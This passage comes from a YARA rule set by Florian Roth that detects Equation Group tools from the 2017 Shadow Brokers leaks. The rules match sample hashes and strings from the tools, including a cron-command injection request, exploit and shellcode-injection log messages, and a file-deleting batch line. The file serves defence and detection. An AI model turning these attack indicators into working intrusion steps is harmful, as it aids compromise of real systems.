      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-09"
      hash1 = "f5ed8312fc6e624b04e1e2d6614f3c651c9e9902ff41f4d069c32caca0869fa4"
      id = "9ec19323-85d5-5edf-99eb-b452c09b870a"
   strings:
      $x1 = "HTTP_REFERER=\"https://127.0.0.1:6655/cgi/redmin?op=cron&action=once\"" fullword ascii
      $x2 = "exec /usr/share/redmin/cgi/redmin" fullword ascii
   condition:
      ( filesize < 1KB and 1 of them )
}

rule EquationGroup_gr_dev_bin_post {
   meta:
      description = "Equation Group hack tool set"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-09"
      hash1 = "c1546155efa95dbc4e3cc95299a3968fc075f89d33164e78b00b76c7d08a0591"
      id = "9ec19323-85d5-5edf-99eb-b452c09b870a"
   strings:
      $x1 = "op=cron&action=once&frame=cronOnceFrame&cronK=cronV&cronCommand=%2Ftmp%2Ftmpwatch&time=12%3A12+01%2F28%2F2005" ascii
   condition:
      ( filesize < 1KB and all of them )
}

rule EquationGroup_curseyo_win2k_v_1_0_0 {
   meta:
      description = "Equation Group hack tool set"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-09"
      hash1 = "5dc77614764b23a38610fdd8abe5b2274222f206889e4b0974a3fea569055ed6"
      id = "8161907d-d6bd-58c5-806d-387321b93b21"
   strings:
      $s1 = "0123456789abcdefABCEDF:" fullword ascii

      $op0 = { c6 06 5b 8b bd 70 ff ff ff 8b 9d 64 ff ff ff 0f } /* Opcode */
      $op1 = { 55 b8 ff ff ff ff 89 e5 83 ec 28 89 7d fc 8b 7d } /* Opcode */
      $op2 = { ff 05 10 64 41 00 89 34 24 e8 df 1e 00 00 e9 31 } /* Opcode */
   condition:
      ( uint16(0) == 0x5a4d and filesize < 200KB and all of them )
}

rule EquationGroup_gr {
   meta:
      description = "Equation Group hack tool set"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-09"
      hash1 = "d3cd725affd31fa7f0e2595f4d76b09629918612ef0d0307bb85ade1c3985262"
      id = "9ec19323-85d5-5edf-99eb-b452c09b870a"
   strings:
      $s1 = "if [ -f /tmp/tmpwatch ] ; then" fullword ascii
      $s2 = "echo \"bailing. try a different name\"" fullword ascii
   condition:
      ( filesize < 1KB and all of them )
}

rule EquationGroup_curseroot_win2k_v_2_1_0 {
   meta:
      description = "Equation Group hack tool set"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-09"
      hash1 = "a1637948ed6ebbd2e582eb99df0c06b27a77c01ad1779b3d84c65953ca2cb603"
      id = "bd2257ef-8170-547d-9c5e-7ff03404495c"
   strings:
      $s1 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/%s,%s" fullword ascii
      $op0 = { c7 44 24 04 ff ff ff ff 89 04 24 e8 46 65 01 00 } /* Opcode */
      $op1 = { 8d 5d 88 89 1c 24 e8 24 1b 01 00 be ff ff ff ff } /* Opcode */
      $op2 = { d3 e0 48 e9 0c ff ff ff 8b 45 } /* Opcode */
   condition:
      ( uint16(0) == 0x5a4d and filesize < 400KB and $s1 and 2 of ($op*) )
}

rule EquationGroup_cursewham_curserazor_cursezinger_curseroot_win2k {
   meta:
      description = "Equation Group hack tool set"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-09"
      hash1 = "aff27115ac705859871ab1bf14137322d1722f63705d6aeada43d18966843225"
      hash2 = "7a25e26950bac51ca8d37cec945eb9c38a55fa9a53bc96da53b74378fb10b67e"
      id = "6a877998-7021-54cb-b068-452d005955b6"
   strings:
      $s1 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/%s,%s" fullword ascii
      $s3 = ",%02d%03d" fullword ascii
      $s4 = "[%.2u%.2u%.2u%.2u%.2u%.2u]" fullword ascii

      $op1 = { 7d ec 8d 74 3f 01 0f af f7 c1 c6 05 } /* Opcode */
      $op2 = { 29 f1 89 fb d3 eb 89 f1 d3 e7 } /* Opcode */
      $op3 = { 7d e4 8d 5c 3f 01 0f af df c1 c3 05 } /* Opcode */
   condition:
      ( uint16(0) == 0x5a4d and filesize < 400KB and 3 of them )
}

rule EquationGroup_watcher_linux_i386_v_3_3_0 {
   meta:
      description = "Equation Group hack tool set"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-09"
      hash1 = "ce4c9bfa25b8aad8ea68cc275187a894dec5d79e8c0b2f2f3ec4184dc5f402b8"
      id = "3c5dc02b-a11a-5c61-8069-641ba90668ec"
   strings:
      $s1 = "invalid option `" fullword ascii
      $s8 = "readdir64" fullword ascii
      $s9 = "89:z89:%r%opw" fullword wide
      $s13 = "Ropopoprstuvwypypop" fullword wide
      $s17 = "Missing argument for `-x'." fullword ascii
   condition:
      ( uint16(0) == 0x457f and filesize < 700KB and all of them )
}

rule EquationGroup_charm_saver_win2k_v_2_0_0 {
   meta:
      description = "Equation Group hack tool set"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-09"
      hash1 = "0f7936a37482532a8ba5df4112643ed7579dd0e59181bfca9c641b9ba0a9912f"
      id = "9c2e3b70-ffa2-598a-9f99-f7a574b06c14"
   strings:
      $s2 = "0123456789abcdefABCEDF:" fullword ascii

      $op0 = { b8 ff ff ff ff 7f 65 eb 30 8b 55 0c 89 d7 0f b6 } /* Opcode */
      $op2 = { ba ff ff ff ff 83 c4 6c 89 d0 5b 5e 5f 5d c3 90 } /* Opcode */
   condition:
      ( uint16(0) == 0x5a4d and filesize < 400KB and all of them )
}

rule EquationGroup_cursehappy_win2k_v_6_1_0 {
   meta:
      description = "Equation Group hack tool set"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-09"
      hash1 = "eb669afd246a7ac4de79724abcce5bda38117b3138908b90cac58936520ea632"
      id = "7b75d4aa-2cbc-57fc-8fda-015bbc1fb25e"
   strings:
      $op1 = { e8 24 2c 01 00 85 c0 89 c6 ba ff ff ff ff 74 d6 } /* Opcode */
      $op2 = { 89 4c 24 04 89 34 24 89 44 24 08 e8 ce 49 ff ff } /* Opcode */
   condition:
      ( uint16(0) == 0x5a4d and filesize < 400KB and all of them )
}

rule EquationGroup_morerats_client_Store {
   meta:
      description = "Equation Group hack tool set"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-09"
      hash1 = "619944358bc0e1faffd652b6af0600de055c5e7f1f1d91a8051ed9adf5a5b465"
      id = "de6de983-fad2-58cf-95be-57109436d5fc"
   strings:
      $s1 = "[-] Failed to mmap file: %s" fullword ascii
      $s2 = "[-] can not NULL terminate input data" fullword ascii
      $s3 = "Missing argument for `-x'." fullword ascii
      $s4 = "[!] Value has size of 0!" fullword ascii
   condition:
      ( uint16(0) == 0x457f and filesize < 60KB and 2 of them )
}

rule EquationGroup_watcher_linux_x86_64_v_3_3_0 {
   meta:
      description = "Equation Group hack tool set"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-09"
      hash1 = "a8d65593f6296d6d06230bcede53b9152842f1eee56a2a72b0a88c4f463a09c3"
      id = "4077242e-a0f2-54a8-afad-f52b8ed874ba"
   strings:
      $s1 = "forceprismheader" fullword ascii
      $s2 = "invalid option `" fullword ascii
      $s3 = "forceprism" fullword ascii
   condition:
      ( uint16(0) == 0x457f and filesize < 900KB and all of them )
}

rule EquationGroup_linux_exactchange {
   meta:
      description = "Equation Group hack tool set"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-09"
      super_rule = 1
      hash1 = "dfecaf5b85309de637b84a686dd5d2fca9c429e8285b7147ae4213c1f49d39e6"
      hash2 = "6ef6b7ec1f1271503957cf10bb6b1bfcedb872d2de3649f225cf1d22da658bec"
      hash3 = "39d4f83c7e64f5b89df9851bdba917cf73a3449920a6925b6cd379f2fdec2a8b"
      hash4 = "15e12c1c27304e4a68a268e392be4972f7c6edf3d4d387e5b7d2ed77a5b43c2c"
      id = "cd9487be-57c5-5352-bce7-f9510166182d"
   strings:
      $x1 = "[+] looking for vulnerable socket" fullword ascii
      $x2 = "can't use 32-bit exploit on 64-bit target" fullword ascii
      $x3 = "[+] %s socket ready, exploiting..." fullword ascii
      $x4 = "[!] nothing looks vulnerable, trying everything" fullword ascii
   condition:
      ( uint16(0) == 0x457f and filesize < 2000KB and 1 of them )
}

rule EquationGroup_x86_linux_exactchange {
   meta:
      description = "Equation Group hack tool set"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-09"
      super_rule = 1
      hash1 = "dfecaf5b85309de637b84a686dd5d2fca9c429e8285b7147ae4213c1f49d39e6"
      hash2 = "6ef6b7ec1f1271503957cf10bb6b1bfcedb872d2de3649f225cf1d22da658bec"
      id = "b39e0c6e-b427-5085-99f8-88b2e00bb110"
   strings:
      $x1 = "kernel has 4G/4G split, not exploitable" fullword ascii
      $x2 = "[+] kernel stack size is %d" fullword ascii
   condition:
      ( uint16(0) == 0x457f and filesize < 1000KB and 1 of them )
}

/*
   Yara Rule Set
   Author: Florian Roth
   Date: 2017-04-15
   Identifier: Equation Group Toolset - Windows Folder
   Reference: https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation
*/

/* Rule Set ----------------------------------------------------------------- */

rule EquationGroup_Toolset_Apr17_Eclipsedwing_Rpcproxy_Pcdlllauncher {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15"
      hash1 = "48251fb89c510fb3efa14c4b5b546fbde918ed8bb25f041a801e3874bd4f60f8"
      hash2 = "237c22f4d43fdacfcbd6e1b5f1c71578279b7b06ea8e512b4b6b50f10e8ccf10"
      hash3 = "79a584c127ac6a5e96f02a9c5288043ceb7445de2840b608fc99b55cf86507ed"
      id = "8dd15424-e1b5-5543-97d5-3b3a83faa428"
   strings:
      $x1 = "[-] Failed to Prepare Payload!" fullword ascii
      $x2 = "ShellcodeStartOffset" fullword ascii
      $x3 = "[*] Waiting for AuthCode from exploit" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 100KB and 1 of them )
}

rule EquationGroup_Toolset_Apr17_Explodingcantouch_1_2_1 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15"
      hash1 = "0cdde7472b077610d0068aa7e9035da89fe5d435549749707cae24495c8d8444"
      id = "66a09bfc-992d-5152-9fd6-9d7bcfb8b92f"
   strings:
      $x1 = "[-] Connection closed by remote host (TCP Ack/Fin)" fullword ascii
      $s2 = "[!]Warning: Error on first request - path size may actually be larger than indicated." fullword ascii
      $s4 = "<http://%s/%s> (Not <locktoken:write1>) <http://%s/>" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 150KB and 1 of them )
}

rule EquationGroup_Toolset_Apr17_Architouch_1_0_0 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15"
      hash1 = "444979a2387530c8fbbc5ddb075b15d6a4717c3435859955f37ebc0f40a4addc"
      id = "c5af05b5-9dfa-535f-b9ea-c82ef79bae7e"
   strings:
      $s1 = "[+] Target is %s" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 300KB and all of them )
}

rule EquationGroup_Toolset_Apr17_Erraticgopher_1_0_1 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15"
      hash1 = "3d11fe89ffa14f267391bc539e6808d600e465955ddb854201a1f31a9ded4052"
      id = "1a3fe877-b9ae-50e4-bb1a-c9dcd4d4a657"
   strings:
      $x1 = "[-] Error appending shellcode buffer" fullword ascii
      $x2 = "[-] Shellcode is too big" fullword ascii
      $x3 = "[+] Exploit Payload Sent!" fullword ascii
      $x4 = "[+] Bound to Dimsvc, sending exploit request to opnum 29" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 150KB and 1 of them )
}

rule EquationGroup_Toolset_Apr17_Esteemaudit_2_1_0 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15"
      hash1 = "61f98b12c52739647326e219a1cf99b5440ca56db3b6177ea9db4e3b853c6ea6"
      id = "95594756-1872-5d86-877f-0977bd3c067b"
   strings:
      $x1 = "[+] Connected to target %s:%d" fullword ascii
      $x2 = "[-] build_exploit_run_x64():" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 200KB and 1 of them )
}

rule EquationGroup_Toolset_Apr17_Darkpulsar_1_1_0 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15"
      hash1 = "b439ed18262aec387984184e86bfdb31ca501172b1c066398f8c56d128ba855a"
      id = "0f4f77d7-99bc-5c84-84bf-877c4e79c9f0"
   strings:
      $x1 = "[%s] - Error upgraded DLL architecture does not match target architecture (0x%x)" fullword ascii
      $x2 = "[%s] - Error building DLL loading shellcode" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 100KB and all of them )
}

rule EquationGroup_Toolset_Apr17_Educatedscholar_1_0_0 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15"
      hash1 = "4cce9e39c376f67c16df3bcd69efd9b7472c3b478e2e5ef347e1410f1105c38d"
      id = "37ca8de5-435b-5c1a-83b8-5704fa137604"
   strings:
      $x1 = "[+] Shellcode Callback %s:%d" fullword ascii
      $x2 = "[+] Exploiting Target" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 150KB and 1 of them )
}

rule EquationGroup_Toolset_Apr17_Doublepulsar_1_3_1 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15"
      hash1 = "15ffbb8d382cd2ff7b0bd4c87a7c0bffd1541c2fe86865af445123bc0b770d13"
      id = "99711157-58eb-5ec0-bb9f-bf953cd10125"
   strings:
      $x1 = "[+] Ping returned Target architecture: %s - XOR Key: 0x%08X" fullword ascii
      $x2 = "[.] Sending shellcode to inject DLL" fullword ascii
      $x3 = "[-] Error setting ShellcodeFile name" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 100KB and 1 of them )
}

rule EquationGroup_Toolset_Apr17_Erraticgophertouch_1_0_1 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15"
      hash1 = "729eacf20fe71bd74e57a6b829b45113c5d45003933118b53835779f0b049bad"
      id = "9f03a4b6-69ab-5cef-876c-1e86ef2afe10"
   strings:
      $x1 = "[-] Unable to connect to broswer named pipe, target is NOT vulnerable" fullword ascii
      $x2 = "[-] Unable to bind to Dimsvc RPC syntax, target is NOT vulnerable" fullword ascii
      $x3 = "[+] Bound to Dimsvc, target IS vulnerable" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 30KB and 1 of them )
}

rule EquationGroup_Toolset_Apr17_Smbtouch_1_1_1 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15"
      hash1 = "108243f61c53f00f8f1adcf67c387a8833f1a2149f063dd9ef29205c90a3c30a"
      id = "225799cf-4d1b-54f8-8b76-b9ee1db80ce7"
   strings:
      $x1 = "[+] Target is vulnerable to %d exploit%s" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 400KB and all of them )
}

rule EquationGroup_Toolset_Apr17_Educatedscholartouch_1_0_0 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15"
      hash1 = "f4b958a0d3bb52cb34f18ea293d43fa301ceadb4a259d3503db912d0a9a1e4d8"
      id = "62205374-25a3-5b96-ad0a-a82c9a01a242"
   strings:
      $x1 = "[!] A vulnerable target will not respond." fullword ascii
      $x2 = "[-] Target NOT Vulernable" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 30KB and 1 of them )
}

rule EquationGroup_Toolset_Apr17_Esteemaudittouch_2_1_0 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15"
      hash1 = "f6b9caf503bb664b22c6d39c87620cc17bdb66cef4ccfa48c31f2a3ae13b4281"
      id = "bb66245e-1261-50bd-8666-75fc4c52ad84"
   strings:
      $x1 = "[-] Touching the target failed!" fullword ascii
      $x2 = "[-] OS fingerprint not complete - 0x%08x!" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 200KB and 1 of them )
}

rule EquationGroup_Toolset_Apr17_Rpctouch_2_1_0 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15"
      hash1 = "7fe4c3cedfc98a3e994ca60579f91b8b88bf5ae8cf669baa0928508642c5a887"
      id = "0691768b-ca98-5722-8468-737c4966d54d"
   strings:
      $x1 = "[*] Failed to detect OS / Service Pack on %s:%d" fullword ascii
      $x2 = "[*] SMB String: %s (%s)" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 80KB and 1 of them )
}

rule EquationGroup_Toolset_Apr17_Mofconfig_1_0_0 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15"
      hash1 = "c67a24fe2380331a101d27d6e69b82d968ccbae54a89a2629b6c135436d7bdb2"
      id = "d0d32e19-d004-5941-a5b3-0b4306565cf2"
   strings:
      $x1 = "[-] Get RemoteMOFTriggerPath error" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 50KB and all of them )
}

rule EquationGroup_Toolset_Apr17_Easypi_Explodingcan {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15"
      hash1 = "dc1ddad7e8801b5e37748ec40531a105ba359654ffe8bdb069bd29fb0b5afd94"
      hash2 = "97af543cf1fb59d21ba5ec6cb2f88c8c79c835f19c8f659057d2f58c321a0ad4"
      id = "53d4ebf1-cce3-5fc8-8304-064b4113c9d7"
   strings:
      $x1 = "[-] %s - Target might not be in a usable state." fullword ascii
      $x2 = "[*] Exploiting Target" fullword ascii
      $x3 = "[-] Encoding Exploit Payload failed!" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 100KB and 1 of them )
}

rule EquationGroup_Toolset_Apr17_Eclipsedwingtouch_1_0_4 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15"
      hash1 = "46da99d80fc3eae5d1d5ab2da02ed7e61416e1eafeb23f37b180c46e9eff8a1c"
      id = "87e46fcd-d3e5-506a-97f3-8a18a7ba8042"
   strings:
      $x1 = "[-] The target is NOT vulnerable" fullword ascii
      $x2 = "[+] The target IS VULNERABLE" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 50KB and 1 of them )
}

rule EquationGroup_Toolset_Apr17_Iistouch_1_2_2 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15"
      hash1 = "c433507d393a8aa270576790acb3e995e22f4ded886eb9377116012e247a07c6"
      id = "dd6ea8cc-505d-5c7c-a7ea-c5fa4f14b5ee"
   strings:
      $x1 = "[-] Are you being redirectect? Need to retarget?" fullword ascii
      $x2 = "[+] IIS Target OS: %s" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 60KB and 1 of them )
}

rule EquationGroup_Toolset_Apr17_Namedpipetouch_2_0_0 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15"
      hash1 = "cb5849fcbc473c7df886828d225293ffbd8ee58e221d03b840fd212baeda6e89"
      hash2 = "043d1c9aae6be65f06ab6f0b923e173a96b536cf84e57bfd7eeb9034cd1df8ea"
      id = "0a5519d7-9811-5159-8df2-0cb2995d5085"
   strings:
      $s1 = "[*] Summary: %d pipes found" fullword ascii
      $s3 = "[+] Testing %d pipes" fullword ascii
      $s6 = "[-] Error on SMB startup, aborting" fullword ascii
      $s12 = "92a761c29b946aa458876ff78375e0e28bc8acb0" fullword ascii

      $op1 = { 68 10 10 40 00 56 e8 e1 }
   condition:
      ( uint16(0) == 0x5a4d and filesize < 40KB and 2 of them )
}

rule EquationGroup_Toolset_Apr17_Easybee_1_0_1 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15"
      hash1 = "59c17d6cb564edd32c770cd56b5026e4797cf9169ff549735021053268b31611"
      id = "f170ed34-f7d1-5eb2-9400-4308b6b39388"
   strings:
      $x1 = "@@for /f \"delims=\" %%i in ('findstr /smc:\"%s\" *.msg') do if not \"%%MsgFile1%%\"==\"%%i\" del /f \"%%i\"" fullword ascii
      $x2 = "Logging out of WebAdmin (as target account)" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 200KB and 1 of them )
}

rule EquationGroup_Toolset_Apr17_Regread_1_1_1 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15"
      hash1 = "722f034ba634f45c429c7dafdbff413c08976b069a6b30ec91bfa5ce2e4cda26"
      id = "99a2b146-a277-5917-9a84-3d396d2c8bf9"
   strings:
      $s1 = "[+] Connected to the Registry Service" fullword ascii
      $s2 = "f08d49ac41d1023d9d462d58af51414daff95a6a" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 80KB and 1 of them )
}

rule EquationGroup_Toolset_Apr17_Englishmansdentist_1_2_0 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15"
      hash1 = "2a6ab28885ad7d5d64ac4c4fb8c619eca3b7fb3be883fc67c90f3ea9251f34c6"
      id = "76367c53-9b48-59a1-9ac9-8649fd833fe3"
   strings:
      $x1 = "[+] CheckCredentials(): Checking to see if valid username/password" fullword ascii
      $x2 = "Error connecting to target, TbMakeSocket() %s:%d." fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 200KB and 1 of them )
}

rule EquationGroup_Toolset_Apr17_Architouch_Eternalsynergy_Smbtouch {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15"
      super_rule = 1
      hash1 = "444979a2387530c8fbbc5ddb075b15d6a4717c3435859955f37ebc0f40a4addc"
      hash2 = "92c6a9e648bfd98bbceea3813ce96c6861487826d6b2c3d462debae73ed25b34"
      hash3 = "108243f61c53f00f8f1adcf67c387a8833f1a2149f063dd9ef29205c90a3c30a"
      id = "df3b0794-cbbd-530c-8425-fdf4b116b870"
   strings:
      $s1 = "NtErrorMoreProcessingRequired" fullword ascii
      $s2 = "Command Format Error: Error=%x" fullword ascii
      $s3 = "NtErrorPasswordRestriction" fullword ascii

      $op0 = { 8a 85 58 ff ff ff 88 43 4d }
   condition:
      ( uint16(0) == 0x5a4d and filesize < 600KB and 2 of them )
}

rule EquationGroup_Toolset_Apr17_Eternalromance_2 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15"
      super_rule = 1
      hash1 = "f1ae9fdbb660aae3421fd3e5b626c1e537d8e9ee2f9cd6d56cb70b6878eaca5d"
